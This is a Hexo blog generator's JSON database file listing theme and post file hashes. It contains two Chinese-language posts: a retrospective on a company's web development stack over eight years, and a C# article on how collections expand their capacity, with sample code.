{"meta":{"version":1,"warehouse":"2.2.0"},"models":{"Asset":[{"_id":"themes/apollo/source/favicon.png","path":"favicon.png","modified":1,"renderable":1},{"_id":"themes/apollo/source/favicon1.png","path":"favicon1.png","modified":1,"renderable":1},{"_id":"themes/apollo/source/css/apollo.css","path":"css/apollo.css","modified":1,"renderable":1},{"_id":"themes/apollo/source/scss/apollo.scss","path":"scss/apollo.scss","modified":1,"renderable":1}],"Cache":[{"_id":"themes/apollo/.gitignore","hash":"a006beea0877a0aa3610ee00e73f62cb1d45125b","modified":1466005966000},{"_id":"themes/apollo/LICENSE","hash":"6e31ac9076bfc8f09ae47977419eee4edfb63e5b","modified":1466005966000},{"_id":"themes/apollo/_config.yml","hash":"0af427aef00d8e9ef1f19d5ec1b6d4933bded02b","modified":1466005966000},{"_id":"themes/apollo/gulpfile.js","hash":"857a026b6643a2cd52c65d4ae0dc7fe9618206ee","modified":1466005966000},{"_id":"themes/apollo/package.json","hash":"9426138c09ebb95969021d951590c0c54b187a43","modified":1466005966000},{"_id":"source/.DS_Store","hash":"6974ddb0953597b845d10c3aec9016f9ed161fbb","modified":1473128179000},{"_id":"themes/apollo/README.md","hash":"a6930c691c69ed78584022fbcd0f4245587d09f5","modified":1466005966000},{"_id":"source/_posts/8year-review.md","hash":"3a0e04c857b4a85507953331db47622a65db9858","modified":1466005966000},{"_id":"source/_posts/CSharp-1.md","hash":"49686b2398b173ddaea2c75e4d0f27ff3091376d","modified":1466005966000},{"_id":"source/_posts/CSharp-2.md","hash":"9b774a9746860d8f4a84f5f34bf975ad08fd8669","modified":1466005966000},{"_id":"source/_posts/c-1.md","hash":"e7e6025d66ab1fcffa6adea5d0e4970bcf3a0fa9","modified":1466005966000},{"_id":"source/_posts/c-2.md","hash":"df5f5ed9348d44191e7eb5859481b68da7a639a7","modified":1466005966000},{"_id":"source/_posts/c-3.md","hash":"faa75bf59055923c42f35f5bf3c4cc771a583eaf","modified":1466005966000},{"_id":"source/_posts/c-4.md","hash":"240a1241912569938facac2e90c529f9d313107f","modified":1466005966000},{"_id":"source/_posts/c-6.md","hash":"89419b0096ab71df20f21327ee80c5cc7731a4d1","modified":1466005966000},{"_id":"source/_posts/c-5.md","hash":"59e724d4e87252880eca32bab5b038cc17a1981a","modified":1466005966000},{"_id":"source/_posts/c-7.md","hash":"34cf4b1bef9d3d3e90f2d580ba87293eace6c673","modified":1466005966000},{"_id":"source/_posts/english-1.md","hash":"2d63331f9f847e86347bc4a1f4a7fbd5ea351eb4","modified":1466005966000},{"_id":"source/_posts/english-2.md","hash":"399eacde27a76e095f7a0fa3a35896f178569d25","modified":1466005966000},{"_id":"source/_posts/go-1.md","hash":"d079e4efdd290f0f22017b4e3ab01cd4a3b50c78","modified":1466005966000},{"_id":"source/_posts/hello-world.md","hash":"8bcd83816a1b3bacd8e0265e99c9f3393845c694","modified":1466005966000},{"_id":"source/_posts/hishop-1.md","hash":"55d8f2394f5d4bcbcd9abe2d219d82cb5e6da52e","modified":1466005966000},{"_id":"source/_posts/hishop-2.md","hash":"3455e28c203fae39f2fa9825f703ecde6c25f9b7","modified":1466005966000},{"_id":"source/_posts/hishop-3.md","hash":"ba3ae3340ae2405b1e9684be02548f9f01ee93e3","modified":1466005966000},{"_id":"source/_posts/idea-1.md","hash":"5962e83c6a9c7347e21a319a136eefaf769357e9","modified":1467640745000},{"_id":"source/_posts/hishop-4.md","hash":"9d221c624c99cb5a503f5a3671af1e20ee28af50","modified":1466873088000},{"_id":"source/_posts/interview-hishop.md","hash":"047867b0974540449f8788d22bfd4420db6599bb","modified":1466005966000},{"_id":"source/_posts/javascript-base-2.md","hash":"115e1901f7285bb8550dfc77a877683b47b6dbae","modified":1466005966000},{"_id":"source/_posts/javascript-base-3.md","hash":"cbe7fd6d85f4338f242dfa67d0c25bd443d5475c","modified":1466860538000},{"_id":"source/_posts/javascript-base-1.md","hash":"b26fd8055564632efb2aa255a94f703de29111cc","modified":1466049451000},{"_id":"source/_posts/javascript-base-4.md","hash":"fd439117c8f94270ae5618b13b57632df067afeb","modified":1466005966000},{"_id":"source/_posts/nginx-1.md","hash":"4e28ff8aeb9aab3c2a1cb02ba3dce924dfe0599b","modified":1473422550000},{"_id":"source/_posts/jmeter-2.md","hash":"58cf2ae3d7ead385202f22ce3d8eb089c431cee8","modified":1466005966000},{"_id":"source/_posts/lock.md","hash":"1542c616731196c4dc6596a0a3c4cd3a43a083e2","modified":1466005966000},{"_id":"source/_posts/jmeter-1.md","hash":"69f1c5f679d5cc2adc6f43fb55d54c319fafad03","modified":1466005966000},{"_id":"source/_posts/redis-2.md","hash":"ccbf13ac51664e27dde566f460a419e4f4c07e90","modified":1466005966000},{"_id":"source/_posts/redis-3.md","hash":"4ff1b25172afc9932df9a43a0c1effc8be3bc224","modified":1466005966000},{"_id":"source/_posts/redis-1.md","hash":"d0229aa42d2f524ae4ba10f5b853c2a184f37701","modified":1466005966000},{"_id":"source/_posts/redis-4.md","hash":"ed164004c9f8a0b219041ecf3793932efb519b00","modified":1466005966000},{"_id":"source/_posts/redis-5.md","hash":"a14de7528b8186a0b2eddefdfe20296ef37f5edb","modified":1466005966000},{"_id":"source/_posts/redis-6.md","hash":"434fd6b81cdee518d4088bdcadcea536e2a6a439","modified":1466005966000},{"_id":"source/_posts/self-introduce.md","hash":"4b6cb5d81e0956ce5773177f0c1e6446c5100fd6","modified":1473429194000},{"_id":"source/_posts/shortcut.md","hash":"c51f3e6e6624d9d61b8b16341e7d410ab4c88e18","modified":1473440710000},{"_id":"source/_posts/redis-7.md","hash":"f1f08ec6b390082da06c36b78611957baa4ed966","modified":1466005966000},{"_id":"source/_posts/redis-8.md","hash":"82a294521b7bd8ee2a5f54868dc89c7dcb58e317","modified":1466005966000},{"_id":"source/_posts/regex.md","hash":"25c32881b0e63a5400d08dc029aeb2686527538b","modified":1473000613000},{"_id":"themes/apollo/languages/en.yml","hash":"65998758dd27a350b6d4f2dc803970a9c89978da","modified":1466005966000},{"_id":"themes/apollo/languages/zh-cn.yml","hash":"9e4b03e14c094000257ea254fd660dde4c7af63c","modified":1466005966000},{"_id":"themes/apollo/doc/doc-en.md","hash":"1bccce1d01f085aedcb01317d2db23ca61351f13","modified":1466005966000},{"_id":"themes/apollo/doc/doc-zh.md","hash":"3aad2ed65922f6f5dd9731301195474d16a8a9be","modified":1466005966000},{"_id":"themes/apollo/layout/index.jade","hash":"58c451042cad5beeb5a76852bba609c651ff3428","modified":1466005966000},{"_id":"themes/apollo/layout/post.jade","hash":"33ab46ab3736e5d51388939858647942ce375b9b","modified":1466005966000},{"_id":"themes/apollo/source/favicon.png","hash":"1ec9aea7f8bbcce08582467bd1d59d07412dc204","modified":1466005966000},{"_id":"themes/apollo/source/favicon1.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1466005966000},{"_id":"themes/apollo/layout/mixins/paginator.jade","hash":"f4ee2fb61a32e199b48cf93771749edc8a007391","modified":1466005966000},{"_id":"themes/apollo/layout/mixins/post.jade","hash":"f1940d5efc5c2d0068c6907fd0f13f053392419e","modified":1466005966000},{"_id":"themes/apollo/layout/partial/comment.jade","hash":"ff0a2c269c2434da2ac5529872f1d6184a71f96d","modified":1466005966000},{"_id":"themes/apollo/layout/partial/copyright.jade","hash":"2e2ee43c7241279a32b8c1386a2dea1409ef0e1c","modified":1466005966000},{"_id":"themes/apollo/layout/partial/head.jade","hash":"51b2ba6a1cebb275730eb7131eea211c91f0986a","modified":1466005966000},{"_id":"themes/apollo/layout/partial/layout.jade","hash":"d596c281bbba02cf8837f25f8ac0ac06e3d10e72","modified":1466005966000},{"_id":"themes/apollo/layout/partial/nav.jade","hash":"c35d3061da4b053b73150d9741c542d660798270","modified":1466005966000},{"_id":"themes/apollo/layout/partial/scripts.jade","hash":"4c83fec1e2fc5cffefafc2e31835e28122c0fdfd","modified":1466005966000},{"_id":"themes/apollo/source/css/apollo.css","hash":"3769b55e027697d6d163ddf82b664b16c767ba9c","modified":1466005966000},{"_id":"themes/apollo/source/scss/apollo.scss","hash":"2f0ecd6ea1fec0aad4097dcb509b5ed5d1badd5c","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/copyright.scss","hash":"7fc843c37a4dbf9f6e70770398841a73465ec642","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/header.scss","hash":"d24cc6520f3faa7bb80610b858a92639eadcc289","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/base.scss","hash":"88b361e68475caddbab763feed5e1db788ac2cd7","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/footer.scss","hash":"094aca6e52f11b139ac7980ca03fa7b9d8fc7b2f","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/mq.scss","hash":"0b9c7097136ac8e4a07d9702fc4dbe0345ac7596","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/home-post-list.scss","hash":"92858015b8f3dcb4eb91b6dc41563b7aaa91b376","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/post.scss","hash":"3ba64c410edd07e7bf5e9900d9ad9d76f2ff5828","modified":1466005966000},{"_id":"themes/apollo/source/scss/_partial/normalize.scss","hash":"fd0b27bed6f103ea95b08f698ea663ff576dbcf1","modified":1466005966000},{"_id":"public/atom.xml","hash":"7dd1e3a752a7288633b3f735e3bb310079e8038c","modified":1473440789010},{"_id":"public/sitemap.xml","hash":"0d31d3db0e5f5f7f8fe73b6dccfbddd6af175a37","modified":1473440789011},{"_id":"public/2016/09/10/nginx-1/index.html","hash":"b452e7d7f4e055ce15496c6e4668dcd49ce591f1","modified":1473440789034},{"_id":"public/2016/09/04/shortcut/index.html","hash":"80aa127a6404ba0d0b327b8b122116a0f8ae1107","modified":1473440789034},{"_id":"public/2016/08/18/regex/index.html","hash":"f3699b7ea7e727b2e6a1a0387d75bb175717108c","modified":1473440789034},{"_id":"public/2016/07/01/idea-1/index.html","hash":"978bddc23c53b37d1290ff97807fe6b62f7a4b5a","modified":1473440789034},{"_id":"public/2016/06/07/hishop-3/index.html","hash":"578aa3de19792fb6a5d4e90ece7498760e7d056c","modified":1473440789034},{"_id":"public/2016/06/05/hishop-2/index.html","hash":"cdb315f9b80379e430ff8bc3bc8d1ccd23db57a9","modified":1473440789035},{"_id":"public/2016/05/14/english-2/index.html","hash":"2efc5d147ce7a88bc79c668579c661d2fb364f7b","modified":1473440789035},{"_id":"public/2016/05/13/jmeter-2/index.html","hash":"782a976df3da72b06fad4c56ded7b3f4b681dd68","modified":1473440789035},{"_id":"public/2016/05/06/english-1/index.html","hash":"c45702783e7b3d9ea7a2eb7f554c50b6b2e989a5","modified":1473440789035},{"_id":"public/2016/05/02/CSharp-2/index.html","hash":"902f8ffdf21baf8ec5b246b0e54d4a62793642ae","modified":1473440789035},{"_id":"public/2016/04/21/hishop-1/index.html","hash":"8434b4d6db5e29dcb4af9fffb019333e4583c548","modified":1473440789035},{"_id":"public/2016/04/17/c-7/index.html","hash":"4d324ddd022c3ad82da7647e3f65c22ac25550c4","modified":1473440789035},{"_id":"public/2016/04/13/c-6/index.html","hash":"0320d0fac4a483a87bb718941028beea1416d42a","modified":1473440789035},{"_id":"public/2016/03/31/c-4/index.html","hash":"163beb4eb026a85dd8880ad240d69de6f7779da6","modified":1473440789036},{"_id":"public/2016/03/24/c-2/index.html","hash":"1a2ce4dbb9e532dde955f57464bb83010bd56a03","modified":1473440789036},{"_id":"public/2016/03/23/c-1/index.html","hash":"196bb6f3c3adf57304fa54e5ff0b7bbed03de8c6","modified":1473440789036},{"_id":"public/2016/03/21/javascript-base-4/index.html","hash":"c3cc6c26c8439ed1c01e2e2f4a2de4e338ac4f50","modified":1473440789036},{"_id":"public/2016/03/12/jmeter-1/index.html","hash":"a35c3b04b0ca2e8321f7f28531677ec1938b7571","modified":1473440789036},{"_id":"public/2016/03/10/redis-8/index.html","hash":"b2bd61a8d1c6d0e3463b8ed353f06badd76bef79","modified":1473440789036},{"_id":"public/2016/03/09/redis-7/index.html","hash":"a9986a25a5059ac57f13015d2a47c3b811df7746","modified":1473440789036},{"_id":"public/2016/03/08/redis-6/index.html","hash":"291121a394dff80f73eb1fec645888440ac66fac","modified":1473440789036},{"_id":"public/2016/03/07/redis-5/index.html","hash":"81542f4514c3ac822bdd1b6de4713d95561861a9","modified":1473440789036},{"_id":"public/2016/03/05/redis-4/index.html","hash":"aca84f0dafbb11408d7c638e152be7b1605e5601","modified":1473440789036},{"_id":"public/2016/03/03/redis-3/index.html","hash":"b26051a24a6ce0bab258f8b019908d4ad01fd1c8","modified":1473440789036},{"_id":"public/2016/03/02/redis-2/index.html","hash":"878ae9ee071dc8f068d79125740d253b7ed67f2d","modified":1473440789036},{"_id":"public/2016/02/28/redis-1/index.html","hash":"d2d16e8b3f56e99e5d57695b31b30d5a76a509ff","modified":1473440789036},{"_id":"public/2016/02/26/lock/index.html","hash":"5e487ce5ef97d15e7e198eb3ddaa9e3c9edf9c97","modified":1473440789036},{"_id":"public/2016/02/23/8year-review/index.html","hash":"a75d8abe8b9f4465a0797be3b935af554563981e","modified":1473440789036},{"_id":"public/2016/02/21/javascript-base-3/index.html","hash":"b94cd2eabaa74c7e9b3e90565143ac087685552b","modified":1473440789036},{"_id":"public/2016/02/20/javascript-base-2/index.html","hash":"985fc4b5a81edd1eeb1519f94f994857e93d1a2b","modified":1473440789036},{"_id":"public/2016/01/03/javascript-base-1/index.html","hash":"f09c1cac4bf6f38c295088dcd53959cbcc78f963","modified":1473440789036},{"_id":"public/2016/01/02/hello-world/index.html","hash":"5133eef3d9dff22aa4fc0fcc8ac66840f0d4186c","modified":1473440789036},{"_id":"public/2015/12/20/self-introduce/index.html","hash":"1895def1b6c287eb115722628973233bb53e3ce5","modified":1473440789037},{"_id":"public/archives/index.html","hash":"fa6eb2a294449a7398bdc8c43309425229a86aec","modified":1473440789037},{"_id":"public/archives/page/2/index.html","hash":"fdc5b0ef9c59685a1ad9d7210f8701b68fc1874d","modified":1473440789037},{"_id":"public/archives/page/3/index.html","hash":"bfc041a804f4acfde1cbe25f0dbed50bfacb6f67","modified":1473440789037},{"_id":"public/archives/page/4/index.html","hash":"c1a2098a58352e59964ff7fc37df70184ba915be","modified":1473440789037},{"_id":"public/archives/2015/index.html","hash":"61a603a07ccf492b00b7a52efc45aad167daeee1","modified":1473440789037},{"_id":"public/archives/2016/index.html","hash":"13d38360b8a014d40e1edec1f374347817f3434f","modified":1473440789037},{"_id":"public/archives/2015/12/index.html","hash":"61a603a07ccf492b00b7a52efc45aad167daeee1","modified":1473440789037},{"_id":"public/archives/2016/page/2/index.html","hash":"d52b448ab01ee159e2df1c6e64cc3dfb70903aa3","modified":1473440789037},{"_id":"public/archives/2016/page/3/index.html","hash":"2f170eb2ff860810f64dd209bd78e77b7cc7c9d7","modified":1473440789037},{"_id":"public/archives/2016/page/4/index.html","hash":"939fdf36c96d926000d77b20064ff784045429a5","modified":1473440789037},{"_id":"public/archives/2016/01/index.html","hash":"c21c78ed6b86a0e89e3c5e3b9c07b5c0cd0d3fb9","modified":1473440789037},{"_id":"public/archives/2016/02/index.html","hash":"600f062aad8c9d4429dc28b65a23bfbcd1fd28e2","modified":1473440789037},{"_id":"public/archives/2016/03/index.html","hash":"d7679f0467741225782c6c11124a3138c64cd609","modified":1473440789037},{"_id":"public/archives/2016/03/page/2/index.html","hash":"e04a2f5c2d1421183038dd17e109736d6d5dee08","modified":1473440789037},{"_id":"public/archives/2016/04/index.html","hash":"a976325b48a2a29ff00cc545207c506a9cc0bbd7","modified":1473440789038},{"_id":"public/archives/2016/05/index.html","hash":"c85da20936b31bc6b985474020b9113d2c96e6ce","modified":1473440789038},{"_id":"public/archives/2016/06/index.html","hash":"042282bb1cdf529fbe526e0ce35064982ab1dac6","modified":1473440789038},{"_id":"public/archives/2016/07/index.html","hash":"4e8ae2d1db0da60c3d95f9414d1e1dcddba47d8d","modified":1473440789038},{"_id":"public/archives/2016/08/index.html","hash":"180aa908073d53a76414e5111abd8e9e003ce881","modified":1473440789038},{"_id":"public/archives/2016/09/index.html","hash":"2bc31125b4b31a74cd16d35d1379ea8ff1abf120","modified":1473440789038},{"_id":"public/index.html","hash":"1355f69cde271a9ac0beabbb9b046c99796fef4f","modified":1473440789038},{"_id":"public/page/2/index.html","hash":"7d482c2f3b7096f8b73c4abcc958f204297c50e0","modified":1473440789038},{"_id":"public/page/3/index.html","hash":"ad91643669b0224bfe32d25d5b05b3745336784e","modified":1473440789038},{"_id":"public/page/4/index.html","hash":"3b50c198059b0200561d208394c9a8328902e6a6","modified":1473440789038},{"_id":"public/2016/06/23/hishop-4/index.html","hash":"ee8fcab6fc34ab75c548a223541b78f7d41a548a","modified":1473440789038},{"_id":"public/2016/05/08/go-1/index.html","hash":"a4ffc38b7676bf0fe0e5fb6954d4c1a0d0c3a644","modified":1473440789038},{"_id":"public/2016/04/30/CSharp-1/index.html","hash":"a85b6a450dcdb82687323870c676884796a39be7","modified":1473440789038},{"_id":"public/2016/04/12/c-5/index.html","hash":"d313b1ff9353a1a3592b1994727e333c868a8207","modified":1473440789038},{"_id":"public/2016/03/25/c-3/index.html","hash":"ccee14aec5919ee2d4b75912302651386a589f77","modified":1473440789039},{"_id":"public/2016/02/18/interview-hishop/index.html","hash":"204b04c6cdf1e60b8eb7f39c1b1209d1044460d9","modified":1473440789039},{"_id":"public/favicon.png","hash":"1ec9aea7f8bbcce08582467bd1d59d07412dc204","modified":1473440789045},{"_id":"public/favicon1.png","hash":"a9cdcb22d1e74d5480323e19d1983de5a6873b8c","modified":1473440789045},{"_id":"public/scss/apollo.scss","hash":"2f0ecd6ea1fec0aad4097dcb509b5ed5d1badd5c","modified":1473440789045},{"_id":"public/css/apollo.css","hash":"3769b55e027697d6d163ddf82b664b16c767ba9c","modified":1473440789053}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"一家公司的8年技术总结","date":"2016-02-22T16:00:00.000Z","desc":"总结 web研发技术","_content":"今天离职手续终于办完了，顺便回顾一下公司这几年研发技术的发展。\n## asp.net webform\n我刚进公司那会，公司的所有项目基本上都是按照微软的petshop来做的，页面采用webform。当时还是觉得很牛B。当时也不知道什么前后端，所有代码全由后端开发人员包办，从数据库到界面，美工把css写好，开发人员只要在控件中指定css中的class,就可以实现效果，这种方式上手简单，开发快速。缺点就不叙述了，总结一点，只合适做特定项目。\n![webform](/img/1.png)\n## asp.net mvc\n大概在2009年左右，我去参加微软技术大会，当时微软推asp.net mvc。回来之后建议公司采用了asp.net mvc方式开发项目，在此终于有一点前后端的概念了，当然对开发人员要求也高了一些，再没有无所不能的控件使用了，但是更灵活。这时候需要美工做好静态页面，静态页面中还需要包括交互效果，开发人员按照静态页面用服务端模板语言生成。但是09年那次的使用并不成功，1.开发人员要求高，2.当年的版本并不成熟。\n![mvc](/img/2.png)\n## asp.net webapi + 前端mvc的手机开发模式\n从12年公司开始做手机,由于原生开发成本太高，最后采用hybrid开发模式，最终使用开源项目cordova来开发手机app，前后端彻底分开，前端的静态页面直接放到手机中，通过ajax调用webapi中取数据，再把数据绑到前端模板上进行界面渲染。这是美工只需要做图或静态界面，不需要实现界面交互，界面交互、服务端交互、手机交互全由前端开发完成，前端开发还需要定义webapi的接口，后端开发只管实现webapi接口，能满足前端所需要的数据要求。这种以前端为主导的开发模式，对前端开发人员要求更高，但是为公司培养了一堆优秀的前端开发人员。\n![webapi](/img/3.png)\n## 大前端(全栈)开发\n本来想使用此模式尝试做web开发，由前端完成从界面到路由，从登陆到权限，以及session,cookie等进行完全控制，后端专注于业务及数据，按照做手机开发模式那样，给前端开发更大的空间。但最终没能尝试就已离职。\n![全栈开发](/img/4.png)","source":"_posts/8year-review.md","raw":"---\ntitle: 一家公司的8年技术总结\ndate: 2016-2-23\ndesc: 总结 web研发技术\n---\n今天离职手续终于办完了，顺便回顾一下公司这几年研发技术的发展。\n## asp.net webform\n我刚进公司那会，公司的所有项目基本上都是按照微软的petshop来做的，页面采用webform。当时还是觉得很牛B。当时也不知道什么前后端，所有代码全由后端开发人员包办，从数据库到界面，美工把css写好，开发人员只要在控件中指定css中的class,就可以实现效果，这种方式上手简单，开发快速。缺点就不叙述了，总结一点，只合适做特定项目。\n![webform](/img/1.png)\n## asp.net mvc\n大概在2009年左右，我去参加微软技术大会，当时微软推asp.net mvc。回来之后建议公司采用了asp.net mvc方式开发项目，在此终于有一点前后端的概念了，当然对开发人员要求也高了一些，再没有无所不能的控件使用了，但是更灵活。这时候需要美工做好静态页面，静态页面中还需要包括交互效果，开发人员按照静态页面用服务端模板语言生成。但是09年那次的使用并不成功，1.开发人员要求高，2.当年的版本并不成熟。\n![mvc](/img/2.png)\n## asp.net webapi + 前端mvc的手机开发模式\n从12年公司开始做手机,由于原生开发成本太高，最后采用hybrid开发模式，最终使用开源项目cordova来开发手机app，前后端彻底分开，前端的静态页面直接放到手机中，通过ajax调用webapi中取数据，再把数据绑到前端模板上进行界面渲染。这是美工只需要做图或静态界面，不需要实现界面交互，界面交互、服务端交互、手机交互全由前端开发完成，前端开发还需要定义webapi的接口，后端开发只管实现webapi接口，能满足前端所需要的数据要求。这种以前端为主导的开发模式，对前端开发人员要求更高，但是为公司培养了一堆优秀的前端开发人员。\n![webapi](/img/3.png)\n## 大前端(全栈)开发\n本来想使用此模式尝试做web开发，由前端完成从界面到路由，从登陆到权限，以及session,cookie等进行完全控制，后端专注于业务及数据，按照做手机开发模式那样，给前端开发更大的空间。但最终没能尝试就已离职。\n![全栈开发](/img/4.png)","slug":"8year-review","published":1,"updated":"2016-06-15T15:52:46.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cisw0llsd0000g2x6xvhjbpur","content":"<p>今天离职手续终于办完了，顺便回顾一下公司这几年研发技术的发展。</p>\n<h2 id=\"asp-net-webform\"><a href=\"#asp-net-webform\" class=\"headerlink\" title=\"asp.net webform\"></a>asp.net webform</h2><p>我刚进公司那会，公司的所有项目基本上都是按照微软的petshop来做的，页面采用webform。当时还是觉得很牛B。当时也不知道什么前后端，所有代码全由后端开发人员包办，从数据库到界面，美工把css写好，开发人员只要在控件中指定css中的class,就可以实现效果，这种方式上手简单，开发快速。缺点就不叙述了，总结一点，只合适做特定项目。<br><img src=\"/img/1.png\" alt=\"webform\"></p>\n<h2 id=\"asp-net-mvc\"><a href=\"#asp-net-mvc\" class=\"headerlink\" title=\"asp.net mvc\"></a>asp.net mvc</h2><p>大概在2009年左右，我去参加微软技术大会，当时微软推asp.net mvc。回来之后建议公司采用了asp.net mvc方式开发项目，在此终于有一点前后端的概念了，当然对开发人员要求也高了一些，再没有无所不能的控件使用了，但是更灵活。这时候需要美工做好静态页面，静态页面中还需要包括交互效果，开发人员按照静态页面用服务端模板语言生成。但是09年那次的使用并不成功，1.开发人员要求高，2.当年的版本并不成熟。<br><img src=\"/img/2.png\" alt=\"mvc\"></p>\n<h2 id=\"asp-net-webapi-前端mvc的手机开发模式\"><a href=\"#asp-net-webapi-前端mvc的手机开发模式\" class=\"headerlink\" title=\"asp.net webapi + 前端mvc的手机开发模式\"></a>asp.net webapi + 前端mvc的手机开发模式</h2><p>从12年公司开始做手机,由于原生开发成本太高，最后采用hybrid开发模式，最终使用开源项目cordova来开发手机app，前后端彻底分开，前端的静态页面直接放到手机中，通过ajax调用webapi中取数据，再把数据绑到前端模板上进行界面渲染。这是美工只需要做图或静态界面，不需要实现界面交互，界面交互、服务端交互、手机交互全由前端开发完成，前端开发还需要定义webapi的接口，后端开发只管实现webapi接口，能满足前端所需要的数据要求。这种以前端为主导的开发模式，对前端开发人员要求更高，但是为公司培养了一堆优秀的前端开发人员。<br><img src=\"/img/3.png\" alt=\"webapi\"></p>\n<h2 id=\"大前端-全栈-开发\"><a href=\"#大前端-全栈-开发\" class=\"headerlink\" title=\"大前端(全栈)开发\"></a>大前端(全栈)开发</h2><p>本来想使用此模式尝试做web开发，由前端完成从界面到路由，从登陆到权限，以及session,cookie等进行完全控制，后端专注于业务及数据，按照做手机开发模式那样，给前端开发更大的空间。但最终没能尝试就已离职。<br><img src=\"/img/4.png\" alt=\"全栈开发\"></p>\n","excerpt":"","more":"<p>今天离职手续终于办完了，顺便回顾一下公司这几年研发技术的发展。</p>\n<h2 id=\"asp-net-webform\"><a href=\"#asp-net-webform\" class=\"headerlink\" title=\"asp.net webform\"></a>asp.net webform</h2><p>我刚进公司那会，公司的所有项目基本上都是按照微软的petshop来做的，页面采用webform。当时还是觉得很牛B。当时也不知道什么前后端，所有代码全由后端开发人员包办，从数据库到界面，美工把css写好，开发人员只要在控件中指定css中的class,就可以实现效果，这种方式上手简单，开发快速。缺点就不叙述了，总结一点，只合适做特定项目。<br><img src=\"/img/1.png\" alt=\"webform\"></p>\n<h2 id=\"asp-net-mvc\"><a href=\"#asp-net-mvc\" class=\"headerlink\" title=\"asp.net mvc\"></a>asp.net mvc</h2><p>大概在2009年左右，我去参加微软技术大会，当时微软推asp.net mvc。回来之后建议公司采用了asp.net mvc方式开发项目，在此终于有一点前后端的概念了，当然对开发人员要求也高了一些，再没有无所不能的控件使用了，但是更灵活。这时候需要美工做好静态页面，静态页面中还需要包括交互效果，开发人员按照静态页面用服务端模板语言生成。但是09年那次的使用并不成功，1.开发人员要求高，2.当年的版本并不成熟。<br><img src=\"/img/2.png\" alt=\"mvc\"></p>\n<h2 id=\"asp-net-webapi-前端mvc的手机开发模式\"><a href=\"#asp-net-webapi-前端mvc的手机开发模式\" class=\"headerlink\" title=\"asp.net webapi + 前端mvc的手机开发模式\"></a>asp.net webapi + 前端mvc的手机开发模式</h2><p>从12年公司开始做手机,由于原生开发成本太高，最后采用hybrid开发模式，最终使用开源项目cordova来开发手机app，前后端彻底分开，前端的静态页面直接放到手机中，通过ajax调用webapi中取数据，再把数据绑到前端模板上进行界面渲染。这是美工只需要做图或静态界面，不需要实现界面交互，界面交互、服务端交互、手机交互全由前端开发完成，前端开发还需要定义webapi的接口，后端开发只管实现webapi接口，能满足前端所需要的数据要求。这种以前端为主导的开发模式，对前端开发人员要求更高，但是为公司培养了一堆优秀的前端开发人员。<br><img src=\"/img/3.png\" alt=\"webapi\"></p>\n<h2 id=\"大前端-全栈-开发\"><a href=\"#大前端-全栈-开发\" class=\"headerlink\" title=\"大前端(全栈)开发\"></a>大前端(全栈)开发</h2><p>本来想使用此模式尝试做web开发，由前端完成从界面到路由，从登陆到权限，以及session,cookie等进行完全控制，后端专注于业务及数据，按照做手机开发模式那样，给前端开发更大的空间。但最终没能尝试就已离职。<br><img src=\"/img/4.png\" alt=\"全栈开发\"></p>\n"},{"title":"C#由内存模型说性能2 数组与集合","date":"2016-05-01T16:00:00.000Z","desc":"gc C# 性能优化 集合","_content":"由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的\n\n## 数组与集合\n大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.\n<!-- more -->\n\n## 集合如何实现动态扩容\n拿ArrayList和List为例,实际的代码大概如下:\n\n``` CSharp\n/// <summary>\n/// 增加元素\n/// </summary>\npublic virtual int Add(object value)\n{\n\t//超出集合大小\n    if (this._size == this._items.Length)\n    {\n        this.EnsureCapacity(this._size + 1);\n    }\n    this._items[this._size] = value;\n    this._version++;\n    return this._size++;\n}\n/// <summary>\n/// 设置容量大小 默认容量为4,超出容量则扩容2倍\n/// </summary>\nprivate void EnsureCapacity(int min)\n{\n    if (this._items.Length < min)\n    {\n    \t//默认容量为4,超出容量则扩容2倍\n        int num = (this._items.Length == 0) ? 4 : (this._items.Length * 2);\n        if (num < min)\n        {\n            num = min;\n        }\n        this.Capacity = num;\n    }\n}\n/// <summary>\n/// 设置容量大小\n/// </summary>\npublic virtual int Capacity\n{\n    get\n    {\n        return this._items.Length;\n    }\n    set\n    {\n        if (value != this._items.Length)\n        {\n            if (value < this._size)\n            {\n                throw new ArgumentOutOfRangeException(\"value\", Environment.GetResourceString(\"ArgumentOutOfRange_SmallCapacity\"));\n            }\n            if (value > 0)\n            {\n                object[] array = new object[value];//重新分配内存\n                if (this._size > 0) \n                {\n                    Array.Copy(this._items, 0, array, 0, this._size); \n                }\n                this._items = array;\n                return; \n            } \n            this._items = new object[4]; \n        } \n    } \n}\n```\n\n测试\n\n``` CSharp\nList<int> list = new List<int>();//list.Capacity=0\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=4\nlist.Add(new int());//list.Capacity=8\n```\n\n## 总结\n* 无论是List,ArrayList或其它集合,不过是对Array的一层包装,也由此可以断定集合的性能肯定不如Array。\n* 集合的扩容过程增加CPU的损耗和GC的压力，对于问题的严重性就取决于实际应用的场合，如果在高并发的应用下存在大量这操作那问题就变得严重多了。\n* 使用:对集合初始化的时候指定容量,如果可以直接使用Array代替集合。","source":"_posts/CSharp-2.md","raw":"---\ntitle: C#由内存模型说性能2 数组与集合\ndate: 2016-5-2\ndesc: gc C# 性能优化 集合\n---\n由于.net不会实时回收内存，那么.net对数组与集合是内存的是怎么处理的\n\n## 数组与集合\n大家都知道数组必须指定大小，而且大小一但指定就不能更改了，也就是说数组不能动态的增加容量，那么对于一些需要动态增加容量的需求是实现不了的。实现动态扩容的需求都是通过集合,如List,Dictionary,ArrayList.\n<!-- more -->\n\n## 集合如何实现动态扩容\n拿ArrayList和List为例,实际的代码大概如下:\n\n``` CSharp\n/// <summary>\n/// 增加元素\n/// </summary>\npublic virtual int Add(object value)\n{\n\t//超出集合大小\n    if (this._size == this._items.Length)\n    {\n        this.EnsureCapacity(this._size + 1);\n    }\n   